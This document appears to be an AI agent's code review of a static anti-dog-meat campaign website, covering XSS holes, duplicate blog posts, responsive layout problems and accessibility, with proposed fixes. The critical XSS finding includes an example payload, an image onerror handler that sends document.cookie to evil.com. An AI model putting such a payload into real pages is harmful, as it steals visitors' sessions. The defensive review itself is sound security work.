# Website Code Quality Review

**Date:** 2026-03-22
**Type:** website-review
**Reviewer:** code-review-expert agent
**Scope:** Complete frontend codebase (all 7 HTML pages, CSS, JavaScript)
**Phase Context:** Post-Phase 4 (Blog Storage Migration) verification

---

## Executive Summary

The website is a well-structured static campaign site with strong visual design and good semantic HTML foundations. However, there are **three critical XSS vulnerabilities** in blog rendering, significant duplicate content in production data, and responsive breakage from inline styles. The site is not ready for production deployment without addressing security and data quality issues.

---

## Critical Findings

### [C1] XSS Vulnerability in post.html - Unsanitized innerHTML

**Severity:** RED - Critical
**File(s):** `website/post.html` line 134
**Impact:** Stored XSS - AI-generated content inserted directly into DOM without sanitization. Malicious payload in post JSON executes in every visitor's browser.

**Code:**
```javascript
document.getElementById('post-body').innerHTML = post.body_html;
```

**Scenario:** If a malicious payload enters `body_html`:
```json
"body_html": "<img src=x onerror='document.location=\"https://evil.com/steal?c=\"+document.cookie'>"
```
Every visitor to that post will have their session hijacked.

**Fix:** Sanitize HTML before insertion using DOMPurify:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
```
```javascript
document.getElementById('post-body').innerHTML = DOMPurify.sanitize(post.body_html);
```

---

### [C2] XSS Vulnerability in blog.html - Unescaped Data in HTML Concatenation

**Severity:** RED - Critical
**File(s):** `website/blog.html` lines 145-157
**Impact:** Reflected XSS - Every field from index.json (tag, id, title, excerpt, author) concatenated into HTML without escaping.

**Code:**
```javascript
list.innerHTML = posts.map(function (p) {
  return '<article class="blog-post-card">' +
    '<span class="blog-tag">' + p.tag + '</span>' +
    '<h2><a href="post.html?id=' + p.id + '">' + p.title + '</a></h2>' +
    '<p>' + p.excerpt + '</p>' +
    '<span>' + p.author + '</span>' +
    // ...
}).join('');
```

**Fix:** Create escape utility and apply to all interpolated data:
```javascript
function escapeHTML(str) {
  var div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Then use it:
'<span class="blog-tag">' + escapeHTML(p.tag) + '</span>' +
'<h2><a href="post.html?id=' + encodeURIComponent(p.id) + '">' + escapeHTML(p.title) + '</a></h2>' +
'<p>' + escapeHTML(p.excerpt) + '</p>' +
```

---

### [C3] XSS via URL Parameter - Unsanitized id in Fetch URL

**Severity:** RED - Critical
**File(s):** `website/post.html` lines 112-121
**Impact:** Path traversal potential - URL query parameter used directly in fetch path without validation.

**Code:**
```javascript
var params = new URLSearchParams(window.location.search);
var id = params.get('id');
fetch('data/posts/' + id + '.json')
```

**Fix:** Validate ID against safe pattern:
```javascript
var id = params.get('id');
if (!id || !/^[a-z0-9\-]+$/.test(id)) {
  document.getElementById('post-loading').style.display = 'none';
  document.getElementById('post-error').style.display = 'block';
  return;
}
```

---

## Important Findings

### [I1] Duplicate Blog Posts in Production Data

**Severity:** YELLOW - Important
**File(s):** `website/data/index.json`
**Impact:** Five of ten posts are variations on the same topic, all dated 2026-03-22. Two posts have identical titles, excerpts, and body_html. Destroys credibility.

**Posts:**
- `zero-registered-slaughterhouses-vietnams-dog-meat-trade-has-no-rules-1`
- `zero-registered-slaughterhouses-vietnams-dog-meat-trade-has-no-rules`
- `zero-registered-slaughterhouses-vietnams-dog-meat-trade-has-no-safety-net-1`
- `zero-registered-slaughterhouses-vietnams-dog-meat-trade-has-no-food-safety-net`
- `zero-registered-slaughterhouses-vietnams-dog-meat-trade-has-no-safety-net`

**Fix:** Clean duplicates from index.json and data/posts/. Add deduplication logic to blog_publisher.py.

---

### [I2] Responsive Breakage - Hardcoded Inline Grid Layouts

**Severity:** YELLOW - Important
**File(s):** `website/about.html` line 78, `website/token.html` line 61
**Impact:** Inline styles override CSS media queries. Two-column grids don't collapse on mobile/tablet.

**Code:**
```html
<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 60px; align-items: center;">
```

On 375px iPhone screen, each column is ~175px wide, making text nearly unreadable.

**Fix:** Replace with CSS class:
```css
.two-col-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 60px;
  align-items: center;
}

@media (max-width: 960px) {
  .two-col-grid { grid-template-columns: 1fr; }
}
```

---

### [I3] Brand Compliance Error - Blog Sidebar References Wrong AI

**Severity:** YELLOW - Important
**File(s):** `website/blog.html` line 69
**Impact:** Factual error visible to all visitors. Text says "Gemini" but pipeline uses Claude Sonnet 4.6.

**Current:**
```html
Articles are researched daily using Manus AI to surface local reports, then synthesised by Gemini into balanced, evidence-based post themes.
```

**Fix:**
```html
Articles are researched daily using Manus AI to surface local reports, then synthesised by Claude into balanced, evidence-based post themes. Content is reviewed by Tuan Anh before publication.
```

---

### [I4] Excessive Inline Styles - Maintainability Problem

**Severity:** YELLOW - Important
**File(s):** All pages, especially `about.html` (15+), `donate.html` (20+), `token.html` (25+)
**Impact:** Cannot override with media queries, cannot theme, creates maintenance nightmare.

**Example from donate.html line 80:**
```html
<div style="background: #fff; border: 1px solid #e8e4de; border-radius: 6px; padding: 28px 32px; box-shadow: var(--shadow); display: grid; grid-template-columns: 120px 1fr; gap: 24px; align-items: center;">
```

**Fix:** Extract to CSS classes (e.g., `.kickstarter-tier`).

---

### [I5] Nav/Footer Duplication Across 7 Files

**Severity:** YELLOW - Important
**File(s):** All 7 HTML pages
**Impact:** Any change requires editing 7 files manually.

**Fix Options:**
1. Server-side includes (SSI)
2. JS-based include loading nav/footer fragments
3. Static site generator like Eleventy
4. Document as maintenance procedure if no tooling desired

---

## Suggestions

### [S1] Missing Open Graph/Twitter Card Meta Tags

**Severity:** GREEN - Suggestion
**Benefit:** Improved social sharing with image previews and controlled titles/descriptions.

**Fix:** Add to every page `<head>`:
```html
<meta property="og:title" content="Stop Dog Eaters - End the Cruel Dog Meat Trade" />
<meta property="og:description" content="Join 95% of Vietnamese citizens demanding an end..." />
<meta property="og:image" content="https://stopdogeaters.info/assets/og-share.jpg" />
<meta property="og:url" content="https://stopdogeaters.info/" />
<meta name="twitter:card" content="summary_large_image" />
```

---

### [S2] Blog Index Not Sorted - Relies on Insertion Order

**Severity:** GREEN - Suggestion
**File(s):** `website/blog.html`
**Benefit:** Explicit sort ensures newest posts always appear first.

**Fix:**
```javascript
.then(function (posts) {
  allPosts = posts.sort(function(a, b) { return new Date(b.date) - new Date(a.date); });
  // ...
```

---

### [S3] animateCount() - toLocaleString() Called on String

**Severity:** GREEN - Suggestion
**File(s):** `website/js/main.js` line 61
**Benefit:** Proper locale formatting for decimal stats.

**Current Issue:** When target is not an integer, `current.toFixed(1)` returns a string, and `.toLocaleString()` on a string is a no-op.

---

### [S4] Petition Form - No Client-Side Email Validation Beyond type="email"

**Severity:** GREEN - Suggestion
**File(s):** `website/js/main.js` lines 80-87
**Benefit:** Catch malformed emails before simulated submission.

**Fix:**
```javascript
if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
  showFormMessage(petitionForm, 'Please enter a valid email address.', 'error');
  return;
}
```

---

### [S5] Sidebar Tags Not Keyboard-Accessible

**Severity:** GREEN - Suggestion
**File(s):** `website/blog.html` lines 58-64
**Benefit:** Improved accessibility for keyboard navigation.

**Fix:** Use `<button>` elements instead of `<span>`, or add `tabindex="0"` and `role="button"` with keydown handler.

---

### [S6] No Favicon

**Severity:** GREEN - Suggestion
**Benefit:** Avoid 404s in server logs and show branded tab icon.

---

## Praise

### [P1] Solid CSS Design System

The `style.css` file is well-organized with clear token-based approach using CSS custom properties. Variable naming (`--red`, `--teal`, `--slate`, `--radius-md`, `--shadow`) is consistent and backward-compatibility aliases (`--navy`, `--amber`) show thoughtful migration planning. Responsive breakpoints at 960px and 600px cover main device categories.

---

### [P2] Clean Semantic HTML Structure

Pages use semantic elements appropriately - `<nav>`, `<section>`, `<article>`, `<aside>`, `<footer>`. The `<h1>` through `<h4>` hierarchy is logical. Form labels are properly associated with inputs via `for`/`id` attributes.

---

### [P3] Good Scroll Interaction Patterns

The `IntersectionObserver`-based stat counter animation and scroll-triggered entrance animations in `main.js` are well-implemented. They use `unobserve()` after triggering to avoid re-animation and unnecessary observer overhead.

---

### [P4] Split Blog Storage Architecture

The migration from single `posts.json` to `index.json` + individual post files is the right architectural decision. Index carries only lightweight metadata while full `body_html` is loaded on demand. This scales cleanly as content accumulates.

---

### [P5] Good Error States

Both `blog.html` and `post.html` handle loading, empty, and error states gracefully. Post page shows clear "Article not found" message with link back to blog. Blog listing shows friendly message when no articles match a filter.

---

## Verdict

**Status:** ⚠️ **Request Changes**

The codebase is structurally sound and visually polished, but has **three blocking security issues** that must be resolved before production:

1. XSS vulnerabilities (C1, C2, C3) - could compromise visitor browsers
2. Duplicate blog content (I1) - destroys credibility
3. Responsive breakage (I2) - unusable on mobile

Secondary issues (brand error, missing OG tags, accessibility) should follow in next iteration.

---

## Action Items

- [ ] **CRITICAL:** Fix XSS in post.html (add DOMPurify sanitization)
- [ ] **CRITICAL:** Fix XSS in blog.html (escape all dynamic content)
- [ ] **CRITICAL:** Validate URL parameter in post.html
- [ ] Clean duplicate posts from index.json and data/posts/
- [ ] Fix responsive breakage (extract inline grids to CSS classes)
- [ ] Fix "Gemini" → "Claude" brand error
- [ ] Add Open Graph meta tags
- [ ] Track remaining issues in Phase 5 or Phase 6 plans

---

## Reviewed Files

- `website/index.html`
- `website/about.html`
- `website/petition.html`
- `website/blog.html`
- `website/post.html`
- `website/donate.html`
- `website/token.html`
- `website/css/style.css`
- `website/js/main.js`
- `website/data/index.json`
- `website/data/posts/*.json`
